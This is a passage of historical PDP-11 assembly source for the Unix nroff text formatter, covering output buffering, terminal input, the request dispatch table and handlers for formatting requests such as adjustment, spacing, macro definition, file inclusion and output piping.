	cmp	r0,eibuf
	blo	1b
	rts	pc

restbuf:
	mov	$xbuf,r0
	mov	$ibuf,r1
	mov	xbufp,ibufp
	mov	xeibuf,eibuf
1:
	mov	(r0)+,(r1)+
	cmp	r1,eibuf
	blo	1b
	rts	pc

putchar:
	bic	$!377,r0
	beq	2f
	tstb	r0
	bmi	pchar2
	cmpb	r0,$013 /\e
	bne	0f
	tst	op
	bne	0f
	movb	eschar,r0
	br	putchar
0:
	movb	trtab(r0),r0
	cmp	r0,$' 
	bne	1f
	inc	nsp
2:
	rts	pc
1:
	cmp	r0,$'\n
	bne	1f
	clr	nsp
	clr	ocol
	br	pchar1
1:
	mov	$011,-(sp)
1:
	tst	nsp
	beq	2f
	tst	slow
	bne	4f
	tst	op
	bne	4f
	jsr	pc,dsp
	cmp	nsp,r1
	blt	4f
	mov	$011,(sp)
	cmp	r1,$1
	bgt	8f
	mov	$040,(sp)
	dec	nsp
	br	9f
8:
	sub	r1,nsp
9:
	mov	r0,-(sp)
3:
	mov	2(sp),r0
	jsr	pc,pchar1
	mov	(sp)+,r0
	br	1b
4:
	mov	r0,-(sp)
	mov	$' ,r0
	jsr	pc,pchar1
	mov	(sp)+,r0
	dec	nsp
	bne	4b
2:
	tst	(sp)+
	cmp	r0,$026
	blt	2f
	cmp	r0,$037
	beq	3f
	bgt	2f
	mov	r0,-(sp)
	jsr	r5, switch; unpfx
	cmp	(sp)+,r0
	beq	2f
	mov	r0,-(sp)
	mov	$033,r0  /prefix
	jsr	pc,pchar1
	dec	ocol
	mov	(sp)+,r0
2:
pchar1:
	cmp	r0,$011
	bne	1f
	jsr	pc,dsp
	br	2f
1:
	jsr	pc,width
2:
	add	r1,ocol
pchar2:
	tst	op
	beq	1f
	mov	op,r1
	jsr	pc,wbf
	mov	r1,op
	br	3f
1:
	tst	tflg
	bne	1f
	cmp	pn,pfrom
	blt	3f
	clr	pfrom
1:
	movb	r0,*obufp
	inc	obufp
	cmp	obufp,$obuf+512.
	beq	flush
3:
	rts	pc

dsp:
	clr	r1
1:
	add	$8.,r1
	cmp	ocol,r1
	bgt	1b
	sub	ocol,r1
	bne	2f
	mov	$8.,r1
2:
	rts	pc

unpfx:
   .byte 032, '9
   .byte 035, '8
   .byte 036, '7
   .byte 031, '3
   .byte 030, '4
   .byte 026, '1
   .byte 027, '2
   .byte 0,0

flush:
	mov	obufp,r0
	sub	$obuf,r0
	mov	r0,0f
	mov	outid,r0
	sys	0;7f
.data
7:	sys	write; obuf; 0:0
.text
	jes	place
	inc	toolate
	mov	$obuf,obufp
	rts	pc

rdtty:
/	mov	sp,r1
/	sys	signal; 2; rdtty1
	clr	r0
	sys	read; char; 1
	tst	r0
	bne	2f
rdtty1:
/	mov	r1,sp
	jsr	pc,popi
rdtty2:
	clr	tty
	tst	quiet
	beq	0f
	bis	$10,ttym
	mov	ttyid,r0
	sys	stty; ttys
0:
	clr	r0
1:
/	sys	signal; 2; place
	rts pc
2:
	mov	char,r0
	cmpb	r0,$'\n
	beq	3f
	mov	$1,tty
	br	1b
3:
	inc	tty
	cmp	tty,$3
	beq	rdtty1
	br	1b

ttyn:
	mov	r1,-(sp)
	mov	$'x,-(sp)
	clr	-(sp)
	sys	fstat; ybuf
	bes	3f
	mov	ybuf+2,(sp)
	sys	open; dev; 0
	bes	3f
	mov	r0,r1
1:
	mov	r1,r0
	sys	read; ybuf; 16.
	bes	2f
	cmp	r0,$16.
	bne	2f
	mov	$ybuf,r0
	cmp	(r0)+,(sp)
	bne	1b
	cmp	(r0)+,$"tt
	bne	1b
	cmpb	(r0)+,$'y
	bne	1b
	tstb	(r0)+
	beq	1b
	cmpb	(r0),$'\0
	bne	1b
	movb	-(r0),2(sp)
2:
	mov	r1,r0
	sys	close
3:
	tst	(sp)+
	movb	(sp)+,r0
	mov	(sp)+,r1
	rts	pc
dev:	</dev\0>
.even

cont1:
	mov	r0,-(sp)
	mov	pc,r2
	br	0f
control:
	jsr	pc,getchar
	mov	r0,-(sp)
	jsr	pc,getchar
	cmpb	r0,$'\n
	beq	8f
	cmpb	r0,$' /
	bne	9f
8:
	mov	r0,ch
	clr	r0
9:
	swab	r0
	bis	(sp),r0
	clr	r2
0:
	mov	$contab,r1
1:
	mov	(r1)+,(sp)
	bic	$100000,(sp)
	cmp	r0,(sp)
	bne	4f
	mov	(r1),(sp)
	tst	-(r1)
	bpl	3f
	clr	*nxf
	tst	r2
	bne	2f
	jsr	pc,collect
2:
	jsr	pc,flushi
	jsr	pc,pushi
	beq	5f
	mov	(sp),ip
	br	5f
3:
	jmp	*(sp)+
4:
	cmp	(r1)+,$-1
	bne	1b
5:
	tst	(sp)+
	rts	pc

.data
contab:
<ad>; casead
<bp>; casebp
<pn>; casepn
<br>; casebr
<cc>; casecc
<c2>; casec2
<ce>; casece
<fi>; casefi
<in>; casein
<li>; caseli
<ll>; casell
<ls>; casels
<ns>; casens
<rs>; casers
<na>; casena
<ne>; casene
<nf>; casenf
<pl>; casepl
<sp>; casesp
<lv>; casesv
<sv>; casesv
<os>; caseos
<ta>; caseta
<ti>; caseti
<tr>; casetr
<ul>; caseul
<tl>; casetl
<lt>; caselt
<hc>; casehc
<hy>; casehy
<nh>; casenh
<nm>; casenm
<np>; casenp
<nn>; casenn
<ar>; casear
<ro>; casero
<RO>; caseroc
<nx>; casenx
<so>; caseso
<po>; casepo
<de>; casede
<ds>; caseds
<am>; caseam
<as>; caseas
<da>; caseda
<di>; casedi
<rm>; caserm
<rn>; casern
<ig>; caseig
<tc>; casetc
<ec>; caseec
<eo>; caseeo
<lc>; caselc
<nc>; casenc
<ev>; caseev
<if>; caseif
<wh>; casewh
<ch>; casech
<rd>; caserd
<tm>; casetm
<nr>; casenr
<mk>; casemk
<rt>; casert
<ab>; casest
<fl>; casefl
<ex>; done
<xh>; casexh
<em>; caseem
<fc>; casefc
<af>; caseaf
<pi>; casepi
<hw>; casehw
bnames: .=.+512.
-1; -1
.text
-- /usr/source/s7/nroff2.s mode=0110664 uid=3 gid=3 atime=174924234 mtime=174845684 --
/
/

/ nroff2

casead:
	inc	ad
	jsr	pc,skipcont
	tst	nlflg
	bne	1f
	jsr	pc,getchar
	cmp	r0,$'r	/right adj, left ragged
	bne	0f
	mov	$2,jfomod
	br	1f
0:
	cmp	r0,$'l	/left adj, right ragged
	bne	0f
	clr	jfomod
	clr	ad
	br	1f
0:
	cmp	r0,$'c	/centered adj
	bne	0f
	mov	$1,jfomod
	br	1f
0:
	clr	jfomod	/left and right adj
	inc	ad
1:
	rts	pc

casebr:
	jsr	pc,rbreak
	rts	pc

casecc:
	clr	-(sp)
	br	0f
casec2:
	mov	pc,-(sp)
0:
	jsr	pc,skipcont
	jsr	pc,getchar
	cmp	r0,$'\n
	beq	2f
	tst	(sp)
	bne	1f
	mov	r0,cc
	br	2f
1:
	mov	r0,c2
2:
	mov	r0,ch
	tst	(sp)+
	rts	pc

casece:
	jsr	r5,number; 0
	jsr	pc,min
	mov	r0,-(sp)
	jsr	pc,rbreak
	mov	(sp)+,ce
	rts	pc

casefi:
	jsr	pc,rbreak
	inc	fi
	rts	pc

casein:
	jsr	pc,skipcont
	tst	nlflg
	beq	1f
	mov	in1,r0
	br	2f
1:
	jsr	r5,number1; in
	jsr	pc,min
2:
	mov	r0,-(sp)
	jsr	pc,rbreak
	mov	in,in1
	mov	(sp)+,in
	tst	nc
	bne	1f
	mov	in,un
	jsr	pc,setnel
1:
	rts	pc

caseli:
	jsr	r5,number; 0
	jsr	pc,min
	mov	r0,lit
	mov	frame,litlev
	cmp	nl,$-1
	bne	0f
	jsr	pc,newln1
0:
	rts	pc

casell:
	jsr	pc,skipcont
	tst	nlflg
	beq	1f
	mov	ll1,r0
	br	2f
1:
	jsr	r5,number1; ll
	jsr	pc,min
2:
	mov	ll,ll1
	mov	r0,ll
2:
	jsr	pc,setnel
	rts	pc

casels:
	jsr	pc,skipcont
	tst	nlflg
	beq	1f
	mov	ls1,r0
	br	2f
1:
	jsr	r5,number1; ls
	dec	r0
	jsr	pc,min
	inc	r0
2:
	mov	r0,-(sp)
/	jsr	pc,rbreak
	mov	ls,ls1
	mov	(sp)+,ls
	rts	pc

casens:
	inc	nls
	rts	pc

casers:
	clr	nls
	rts	pc

casena:
	clr	ad
	rts	pc

casene:
	jsr	r5,number; 0
	jsr	pc,min
	jsr	pc,need2
	rts	pc

casenf:
	jsr	pc,rbreak
	clr	fi
	rts	pc

casepn:
	jsr	pc,skipcont
	bne	1f
	jsr	r5,number1; pn
	jsr	pc,min
	mov	r0,npn
1:
	rts	pc
casebp:
	mov	ilistp,-(sp)
	clr	-(sp)
	jsr	pc,skipcont
	bne	1f
	jsr	r5,number1; pn
	jsr	pc,min
	mov	r0,(sp)
1:
	jsr	pc,rbreak
	mov	(sp)+,r0
	beq	0f
	mov	r0,npn
0:
	bne	2f
	tst	nls
	bne	3f
2:
	mov	(sp),r0
	jsr	pc,eject
3:
	tst	(sp)+
	rts	pc

casepl:
	jsr	pc,skipcont
	tst	nlflg
	bne	1f
	jsr	r5,number1; pl
	mov	r0,pl
	rts	pc
1:
	mov	$66.,pl
	rts	pc

casesp:
	mov	pc,-(sp)
	br	0f
casesp1:
	clr	-(sp)
0:
	mov	r0,-(sp)
	tst	nb
	bne	0f
	jsr	pc,rbreak
0:
	tst	nls
	bne	2f
	clr	r0
	jsr	pc,findt
	tst	nb
	bne	1f
	tst	trap
	bne	2f
1:
	tst	2(sp)
	beq	1f
	jsr	r5,number;0
	mov	r0,(sp)
1:
	cmp	r1,(sp)
	bge	1f
	mov	r1,(sp)
1:
	mov	(sp),r0
	ble	3f
	jsr	r5,nlines; newline
2:
	cmp	(sp)+,(sp)+
	rts	pc
3:
	add	nl,r0
	cmp	(sp)+,(sp)+
	br	casert1

casert:
	mov	markline,r2
	jsr	pc,skipcont
	bne	0f
	jsr	r5,number1;nl
casert1:
	mov	r0,r2
0:
	tst	r2
	blt	2f
	cmp	r2,nl
	bge	2f
	mov	nl,r1
	mov	r2,nl
	sub	r2,r1
	mov	r1,r2
1:
	mov	$036,r0
	jsr	pc,putchar
	dec	r2
	bgt	1b
	mov	$015,r0
	jsr	pc,putchar
2:
	rts	pc

casesv:
	clr	r0
	jsr	pc,findt
	jsr	r5,number; 0
	cmp	r1,r0
	bge	1f
	mov	r0,sv
	rts	pc
1:
	jsr	r5,nlines; newline
	rts	pc

caseos:
	tst	sv
	beq	2f
	clr	r0
	jsr	pc,findt
	cmp	r1,sv
	bge	1f
	rts	pc
1:
	mov	sv,r0
	clr	sv
	jsr	r5,nlines; newline
2:
	rts	pc

casetr:
	jsr	pc,skipcont
1:
	jsr	pc,getchar
	cmp	r0,$'\n
	beq	1f
	mov	r0,r1
	jsr	pc,getchar
	cmp	r0,$'\n
	bne	2f
	mov	$' ,r0
2:
	movb	r0,trtab(r1)
	br	1b
1:
	rts	pc

caseta:
	clr	-(sp)
	mov	$tabtab,r1
1:
	jsr	pc,getchar
	tst	nlflg
	bne	1f
	cmpb	r0,$'+
	bne	0f
	inc	(sp)
	br	2f
0:
	cmpb	r0,$'-
	beq	2f
	cmpb	r0,$'0
	blo	1b
	cmpb	r0,$'9
	bhi	1b
2:
	mov	r0,ch
	jsr	pc,atoi
	beq	1f
	jsr	pc,min
	dec	r0
	ble	1f
	cmp	r1,$tabtab
	beq	0f
	tst	(sp)
	bne	3f
	cmp	r0,-2(r1)
	bgt	0f
3:
	add	-2(r1),r0
0:
	clr	(sp)
	mov	r0,(r1)+
	cmp	r1,$etabtab
	blo	1b
	tst	-(r1)
1:
	tst	(sp)+
	clr	(r1)
	rts	pc

caseti:
	jsr	r5,number; in
	jsr	pc,min
	mov	r0,-(sp)
	jsr	pc,rbreak
	mov	(sp)+,un1
	jsr	pc,setnel
	rts	pc

caseul:
	jsr	r5,number; 0
	jsr	pc,min
	mov	r0,ul
	rts	pc

casetl:
	jsr	pc,header
	rts	pc

caselt:
	jsr	pc,skipcont
	tst	nlflg
	beq	1f
	mov	llh1,r0
	br	2f
1:
	jsr	r5,number1; llh
	jsr	pc,min
2:
	mov	llh,llh1
	mov	r0,llh
	rts	pc


casehc:
	jsr	pc,skipcont
	jsr	pc,getchar
	cmp	r0,$'\n
	bne	1f
	movb	$200,r0
1:
	mov	r0,ohc
	rts	pc

casetc:
	jsr	pc,skipcont
	jsr	pc,getchar
	cmp	r0,$'\n
	bne	1f
	mov	$014,r0
1:
	mov	r0,tabc
	rts	pc

caselc:
	jsr	pc,skipcont
	jsr	pc,getchar
	cmp	r0,$'\n
	bne	1f
	mov	$'.,r0
1:
	mov	r0,dotc
	rts	pc

casenc:
	jsr	pc,skipcont
	jsr	pc,getchar
	cmp	r0,$'\n
	bne	1f
	mov	$034,r0
1:
	mov	r0,numc
	rts	pc

casehy:
	mov	$1,hyf
	jsr	pc,skipcont
	bne	1f
	jsr	pc,atoi
	beq	1f
	jsr	pc,min
	mov	r0,hyf
1:
	rts	pc

casenh:
	clr	hyf
	rts	pc

casenp:
	jsr	pc,skipcont
	tst	nlflg
	beq	2f
	clr	ni
	mov	$1,nms
	mov	$1,ndf
	rts	pc
casenm:
	clr	numbmod
	clr	nn
	jsr	pc,skipcont
	tst	nlflg
	beq	1f
	rts	pc
1:
	inc	numbmod
	jsr	r5,number1; lnumber
	jsr	pc,min
	mov	r0,lnumber
	jsr	pc,skipcont
2:
	jsr	r5,3f; ndf
	tst	ndf
	bne	1f
	inc	ndf
1:
	jsr	pc,skipcont
	jsr	r5,3f; nms
	jsr	pc,skipcont
	jsr	r5,3f; ni
	rts	pc
3:
	tst	nlflg
	bne	4f
	jsr	pc,atoi
	beq	4f
	jsr	pc,min
	mov	r0,*(r5)
4:
	tst	(r5)+
	rts	r5

casenn:
	jsr	r5,number; 0
	jsr	pc,min
	mov	r0,nn
	rts	pc

casear:
	clr	ro
	rts	pc

caseroc:
	mov	$2,ro
	rts	pc
casero:
	mov	$1,ro
	rts	pc

casenx:
	jsr	pc,skipcont
	jsr	r5,getname; nextf
	inc	nx
	jsr	pc,nextfile
	inc	nlflg
	clr	ip
	clr	ap
	clr	nspace
	clr	pendt
	mov	$ilist,ilistp
	rts	pc

casepo:
	jsr	pc,skipcont
	tst	nlflg
	beq	1f
	mov	po1,r0
	br	2f
1:
	jsr	r5,number1; po
	jsr	pc,min
2:
	mov	r0,-(sp)
/	jsr	pc,rbreak
	mov	po,po1
	mov	(sp)+,po
	rts	pc

caseig:
	inc	skp
	jsr	pc,copyb
	rts	pc

casern:
/	inc	lgf
	jsr	pc,skipcont
	jsr	r5,getname;bname
	beq	2f
	jsr	pc,findmn
	beq	2f
	mov	oldptr,-(sp)
/	inc	lgf
	jsr	pc,skipcont
	jsr	r5,getname;bname
	beq	1f
	jsr	pc,findmn
	jsr	pc,clrold
	mov	(sp),r1
	tst	-(r1)
	mov	(r1),(sp)
	bic	$77777,(sp)
	mov	bname,(r1)
	bis	(sp),(r1)
1:
	tst	(sp)+
2:
	rts	pc

caserm:
/	inc	lgf
	jsr	pc,skipcont
	jsr	r5,getname;bname
	beq	1f
	jsr	pc,findmn
	jsr	pc,clrold
1:
	rts	pc

caseas:
	inc	app
caseds:
	inc	ds
	br	casede
caseam:
	inc	app
casede:
	tst	op
	beq	1f
	jsr	pc,wbfl
1:
/	inc	lgf
	jsr	pc,skipcont
	jsr	r5,getname; bname
	bne	1f
	clr	r1
	br	6f
1:
	clr	skp
	jsr	pc,finds
	beq	7f
	tst	ds
	beq	0f
	tst	skp
	bne	5f
	jsr	pc,copys
	br	5f
0:
	jsr	pc,copyb
5:
	jsr	pc,wbfl
	jsr	pc,clrold
	tst	newptr
	beq	0f
	bis	$100000,bname
	mov	bname,*newptr
0:
	mov	r1,-(sp)
	mov	apptr,r1
	beq	0f
	mov	$004,r0
	jsr	pc,wbt
0:
	mov	(sp)+,r1
6:
	clr	app
	clr	ds
	rts	pc
7:
	tst	macerr
	bne	0f
	jsr	r5,stringfl; 8f
0:
	inc	macerr
	cmp	macerr,$1
	jeq	edone
	jmp	done2
/	br	6b
8: <Too many string/macro names.\n\0>
	.even

findmn:
	mov	$contab,r1
1:
	mov	(r1)+,r0
	bic	$100000,r0
	cmp	bname,r0
	beq	2f
	cmp	(r1)+,$-1
	bne	1b
	clr	r1
2:
	mov	r1,oldptr
	rts	pc

finds:
	jsr	pc,findmn
	clr	newptr
	clr	apptr
	clr	aplnk
	tst	app
	beq	0f
	tst	oldptr
	bne	5f
0:
	mov	$contab,r1
1:
	tst	(r1)+
	beq	2f
	cmp	(r1)+,$-1
	bne	1b
1:
	inc	skp
	clr	r1
	rts	pc
2:
	jsr	pc,alloc
	beq	1b
	tst	oldptr
	bne	3f
4:
	tst	-(r1)
	bis	$100000,bname
	mov	bname,(r1)+
	mov	nextb,(r1)
	br	6f
3:
	tst	diflg
	bne	4b
	mov	nextb,(r1)
	tst	-(r1)
	mov	r1,newptr
	br	6f
5:
	tst	-(r1)
	bmi	1f
	clr	app
	br	0b
1:
	tst	(r1)+
	clr	oldptr
	mov	ip,-(sp)
	mov	(r1),ip
1:
	jsr	pc,rbf
	tst	r0
	bne	1b
	mov	ip,r1
	mov	r1,apptr
	tst	diflg
	bne	0f
	jsr	pc,incoff
0:
	mov	r1,nextb
	mov	(sp)+,ip
6:
	clr	app
	mov	nextb,r1
	rts	pc

clrold:
	mov	oldptr,r0
	beq	1f
	mov	(r0),-(sp)
	clr	(r0)
	tst	-(r0)
	bmi	0f
	clr	(sp)
0:
	clr	(r0)
	mov	(sp)+,r0
	beq	1f
	jsr	pc,free
1:
	rts	pc

caseda:
	inc	app
casedi:
/	inc	lgf
	clr	ditf
	jsr	pc,skipcont
	jsr	r5,getname; bname
	beq	1f
	tst	op
	bne	3f
	inc	diflg
	jsr	pc,finds
	beq	3f
	mov	r1,op
	jsr	pc,clrold
/	mov	blss,sblss
/	mov	alss,salss
/	clr	blss
/	clr	alss
	clr	dnl
	br	3f
1:
	tst	op
	beq	3f
	clr	r0
	jsr	pc,pchar1
	jsr	pc,wbfl
/	mov	sblss,blss
/	mov	salss,alss
	clr	op
3:
	clr	app
	clr	diflg
	rts	pc

caseev:
	jsr	pc,skipcont
	tst	nlflg
	beq	2f
	cmp	evp,$elist
	ble	5f
1:
	sub	$2,evp
	mov	*evp,-(sp)
	br	3f
2:
	jsr	pc,atoi
	beq	6f
	cmp	r0,nev
	bgt	6f
	tst	r0
	blt	6f
	cmp	evp,$eliste
	bgt	6f
	mov	r0,-(sp)
	mov	ev,*evp
	add	$2,evp
3:
	cmp	(sp),ev
	beq	4f
	mov	$1024.,r3
	mpy	ev,r3
	mov	r3,8f
	mov	$1024.,r3
	mpy	(sp),r3
	mov	r3,9f
	mov	ibf,r0
	sys	0;7f
.data
7:	sys	seek; 8:.. ; 0
.text
	mov	ibf,r0
	sys	write; block; 1024.
	mov	ibf1,r0
	sys	0;7f
.data
7:	sys	seek; 9:.. ; 0
.text
	mov	blocksize,0f
	mov	ibf1,r0
	sys	0;7f
.data
7:	sys	read; block; 0:..
.text
4:
	mov	(sp)+,ev
5:
	rts	pc
6:
	jsr	r5,string;9f
	rts	pc
9: <Cannot do "ev".\n\0>
.even

caseif:
	clr	-(sp)
	jsr	pc,skipcont
	jsr	pc,getchar
	cmp	r0,$'!
	bne	1f
	inc	(sp)
	br	2f
1:
	mov	r0,ch
2:
	jsr	pc,atoi
	beq	1f
	tst	r0
	bgt	5f /true
	br	6f /false
1:
	jsr	pc,getchar
	cmp	r0,$'e
	bne	1f
	bit	$1,pn
	bne	6f
	br	5f
1:
	cmp	r0,$'o
	bne	1f
	bit	$1,pn
	beq	6f
	br	5f
1:
	cmpb	r0,$'n
	beq	5f
1:
	tst	(sp)+
	rts	pc
5:
	tst	(sp)
	bne	1b
2:
	clr	column
	jsr	pc,getchar
	bmi	0f
	cmpb	r0,$' /
	beq	2b
0:
	mov	r0,ch
	inc	nflush
	br	1b
6:
	tst	(sp)
	beq	1b
	br	2b

casewh:
	clr	-(sp)
	jsr	pc,skipcont
	jsr	pc,getchar
	cmp	r0,$'x
	bne	1f
	mov	$-1,r0
	jsr	pc,findt
	add	nl,r1
	sub	dnl,r1
	mov	r1,r0
	br	2f
1:
	mov	r0,ch
	jsr	pc,atoi
	beq	4f
2:
	mov	r0,(sp)
	jsr	pc,skipcont
	jsr	r5,getname; bname
	tstb	bname
	bne	1f
	clr	bname
1:
	mov	(sp),r0
	jsr	pc,findn
	tst	r1
	beq	1f
	mov	bname,[mlist-nlist](r1)
	br	4f
1:
	mov	$mlist,r1
2:
	tst	(r1)+
	beq	3f
	cmp	r1,$mliste
	bgt	4f
	br	2b
3:
	mov	bname,-2(r1)
	mov	(sp),[nlist-mlist-2](r1)
4:
	tst	(sp)+
	rts	pc

findn:
	mov	$nlist,r1
1:
	cmp	(r1),r0
	beq	3f
2:
	tst	(r1)+
	cmp	r1,$nliste
	bne	1b
	clr	r1
	rts	pc
3:
	tst	[mlist-nlist](r1)
	beq	2b
	rts	pc

findm:
	mov	$mlist,r1
1:
	cmp	(r1),bname
	beq	3f
2:
	tst	(r1)+
	cmp	r1,$mliste
	bne	1b
	clr	r1
	rts	pc
3:
	sub	$[mlist-nlist],r1
	rts	pc

casech:
	clr	-(sp)
	jsr	pc,skipcont
	jsr	pc,atoi
	beq	2f
	jsr	pc,findn
	br	3f
2:
	jsr	r5,getname; bname
	tstb	bname
	beq	1f
	jsr	pc,findm
3:
	tst	r1
	beq	1f
	mov	r1,(sp)
	jsr	pc,skipcont
	jsr	pc,atoi
	beq	2f
	mov	r0,*(sp)
1:
	tst	(sp)+
	rts	pc
2:
	jsr	pc,getchar
	tst	nlflg
	bne	1b
	mov	*(sp),r0
	beq	1b
	bgt	0f
	add	pl,r0
	inc	r0
0:
	sub	nl,r0
	ble	1b
	dec	r0
	ble	1b
	cmp	dnl,r0
	bge	0f
	mov	dnl,r0
0:
	sub	r0,*(sp)
	br	1b

casemk:
	jsr	pc,skipcont
	beq	1f
	mov	nl,markline
	rts	pc
1:
	jsr	r5,getname; bname
	mov	bname,r0
	beq	2f
	jsr	pc,findr
	beq	2f
	mov	nl,(r1)
2:
	rts	pc

casetm:
	inc	copyf
	jsr	pc,skipcont
	mov	$bname,r1
1:
	jsr	pc,getchar
	bmi	1b
	movb	r0,(r1)+
	tst	nlflg
	bne	2f
	cmp	r1,$ename
	blo	1b
	movb	$'\n,-1(r1)
2:
	clrb	(r1)
	jsr	r5,stringfl; bname
	clr	copyf
	rts	pc

caserd:
	jsr	pc,skipcont
	jsr	r5,getname; bname
	tst	iflg
	bne	1f
	tst	quiet
	bne	2f
	tstb	bname
	beq	5f
	jsr	r5,string; bname
	jsr	r5,string; 3f
1:
	jsr	pc,collect
	inc	tty
	jsr	pc,pushi
	beq	6f
	mov	$-1,ip
	rts	pc
2:
	bic	$10,ttym
	mov	ttyid,r0
	sys	stty; ttys
	jsr	pc,flush
5:
	jsr	r5,string;4f
	br	1b
6:
	jmp	rdtty2
3:	<: \0>
4:	<\0> /bell
	.even

caseaf:
	jsr	pc,skipcont
	bne	3f
	jsr	r5,getname;bname
	mov	bname,r0
	beq	3f
	jsr	pc,findr
	jsr	pc,skipcont
	jsr	pc,getchar
	mov	$4f,r2
1:
	cmpb	r0,(r2)+
	beq	2f
	inc	r2
	tstb	(r2)
	bne	1b
2:
	movb	(r2),[flist-vlist](r1)
3:
	rts	pc
4:
.byte '1,1
.byte 'i,2
.byte 'I,3
.byte 'a,4
.byte 'A,5
.byte 0,0

casenr:
	jsr	pc,skipcont
	bne	5f
	jsr	r5,getname; bname
	mov	bname,r0
	jsr	pc,findr
	mov	r1,0f
	beq	5f
	jsr	pc,skipcont
	bne	5f
	jmp	7f
.data
7:	jsr	r5,number1; 0:..
	jmp	8f
.text
8:
	bne	1f
	clr	r0
1:
	mov	r0,*0b
	jsr	pc,skipcont
	bne	5f
	jsr	pc,atoi
	beq	5f
	mov	r0,[inclist-vlist](r1)
5:
	rts	pc

casefl:
	jsr	pc,rbreak
	jsr	pc,flush
	rts	pc

casexh:
/	tst	x.5
/	bne	1f
	inc	x.5
	rts	pc
/1:
/	clr	x.5
/	rts	pc

caseso:
	jsr	pc,skipcont
	tst	nlflg
	bne	1f
	jsr	r5,getname; nextf
	tstb	nextf
	beq	1f
	sys	open; nextf; 0
	bes	1f
	mov	ifp,r1
	cmp	r1,$ifle
	bhi	1f
	mov	r0,-(sp)
	jsr	pc,flushi
	mov	ifile,(r1)
	mov	(sp)+,ifile
	mov	ioff,[offl-ifl](r1)
	add	$2,ifp
	clr	ioff
	inc	nx
	inc	nflush
	tst	(r1)
	bne	1f
	jsr	pc,savebuf
1:
	rts	pc

caseeo:
	clr	r0
	br	1f
caseec:
	jsr	pc,skipcont
	jsr	pc,getchar
	cmpb	r0,$'\n
	bne	1f
	movb	$'\\,r0
1:
	movb	r0,eschar
	movb	r0,eschar+1
	rts	pc

casest:
	4

caseem:
	clr	em
	jsr	pc,skipcont
	bne	1f
	jsr	r5,getname;bname
	beq	1f
	mov	bname,em
1:
	rts	pc

casefc:
	mov	$4,fc
	mov	$' ,padc
	jsr	pc,skipcont
	bne	1f
	jsr	pc,getchar
	bmi	1f
	movb	r0,fc
	jsr	pc,skipcont
	bne	1f
	mov	ch,r0
	bmi	1f
	cmpb	r0,fc
	beq	1f
	movb	r0,padc
1:
	rts	pc

casepi:
	tst	toolate
	bne	1f
	jsr	pc,skipcont
	jsr	r5,getname;bname
	beq	1f
	sys	42. /pipe
	jes	place
	mov	r0,pipin
	mov	r1,outid
	sys	fork
	br	2f
	jes	place
	mov	$1,r0
	sys	close
	mov	pipin,r0
	sys	close
1:
	inc	toolate
	rts	pc
2:
	clr	r0
	sys	close
	mov	pipin,r0
	sys	41. /dup
	mov	outid,r0
	sys	close
	sys	exec;bname;args
	jsr	r5,string;9f
	sys	exit
args: bname;0
9: <exec failed\n\0>
.even
-- /usr/source/s7/nroff3.s mode=0110664 uid=3 gid=3 atime=174924236 mtime=174845692 --
/
/

/ nroff3

skipcont:
/	mov	r2,-(sp)
0:
	jsr	pc,getchar
/	mov	r0,r2
/	jsr	pc,alph2
/	beq	0b
1:
	cmp	$' ,r0
	bne	1f
	jsr	pc,getchar
	br	1b
1:
/	mov	(sp)+,r2
	mov	r0,ch
	tst	nlflg
	rts	pc

rbreak:
	jsr	pc,rbreak1
	clr	totout
	rts	pc
rbreak1:
	clr	trap
	tst	nb
	beq	1f
	rts	pc
1:
	cmp	nl,$-1
	bne	1f
	jsr	pc,newln1
	rts	pc
1:
	tst	nc
	bne	1f
	tst	pendw
	bne	4f
	tst	wch
	beq	4f
	jsr	pc,setnel
	jsr	pc,movword
	nop
1:
	clrb	*linep
	clr	nls
	inc	totout
	tst	lastl
	bmi	1f
	mov	ne,lastl
	br	0f
1:
	mov	ll,lastl
0:
	tst	op
	bne	0f
	mov	po,r0
	jsr	pc,space
0:
	jsr	pc,donum
	mov	un,r0
	jsr	pc,space
	jsr	pc,jfo
	mov	$line,r2
1:
	movb	(r2)+,r0
	cmp	$' ,r0
	bne	2f
	jsr	pc,fill
	tst	nc
	bne	1b
	br	3f
2:
	jsr	pc,putchar
	dec	nc
	bgt	1b
3:
	clr	nwd
	clr	ne
	mov	in,un
	jsr	pc,setnel
	jsr	pc,newline
	cmp	nl,hnl
	ble	0f
	mov	nl,hnl
0:
	tst	trap
	bne	3f
	mov	ls,r2
	dec	r2
	clr	r0
	jsr	pc,findt
	cmp	r1,r2
	bgt	1f
	mov	r1,r0
	jsr	r5,nlines; newline
	br	3f
1:
	mov	r2,r0
	jsr	r5,nlines;newline
3:
/	clr	pendb
	clr	spread
	rts	pc
4:
	jsr	pc,setnel
	rts	pc

jfo:
	tst	jfomod
	beq	1f
	mov	fac,r0
	add	fmq,r0
	beq	1f
	clr	fac
	clr	fmq
	mov	nel,r0
	cmp	jfomod,$1
	bne	2f
	asr	r0
2:
	jsr	pc,space
1:
	rts	pc

donum:
	tst	numbmod
	beq	2f
	dec	nn
	blt	1f
0:
	mov	$3,r0
	add	nms,r0
	add	ni,r0
	jsr	pc,space
	rts	pc
1:
	mov	lnumber,r1
	sxt	r0
	mov	ndf,-(sp)
	dvd	(sp)+,r0
	tst	r1
	beq	1f
	inc	lnumber
	br	0b
1:
	clr	r0
	cmp	lnumber,$100.
	bge	1f
	inc	r0
	cmp	lnumber,$10.
	bge	1f
	inc	r0
1:
	add	ni,r0
	jsr	pc,space
	mov	lnumber,r0
	jsr	r5,decimal; putchar
	mov	nms,r0
	jsr	pc,space
	inc	lnumber
2:
	rts	pc

newline:
	mov	$'\n,r0
	jsr	pc,putchar
	tst	op
	beq	1f
	inc	dnl
	rts	pc
1:
	tst	x.5
	beq	1f
	mov	$032,r0
	jsr	pc,putchar
1:
	inc	nl
	cmp	nl,pl
	blo	3f
newln1:
	clr	nl
	clr	hnl
	clr	ejf
	mov	$ilist,ejl
	tst	donef
	beq	2f
	tst	nc
	bne	1f
	tst	wch
	bne	1f
	jmp	done1
1:
	tst	ndone
	jne	done1
	inc	ndone
	clr	donef
	cmp	frame,$stk
	bne	2f
	inc	nflush
2:
	inc	pn
	tst	npn
	beq	1f
	mov	npn,pn
	clr	npn
1:
	cmp	pn,pto
	ble	2f
	jsr	pc,flush
	jmp	place
2:
	tst	stop
	beq	2f
	cmp	pn,pfrom
	blo	2f
	jsr	pc,flush
/	mov	sp,r1
/	sys	signal; 2; 1f
	mov	ttyid,r0
	sys	read; char; 1
1:
/	mov	r1,sp
/	sys	signal; 2; place
2:
/	cmp	numbmod,$1
/	bne	3f
/	mov	$1,lnumber
3:
	clr	trap
	jsr	pc,findnl
	tst	r1
	beq	4f
	mov	[mlist-nlist](r1),r0
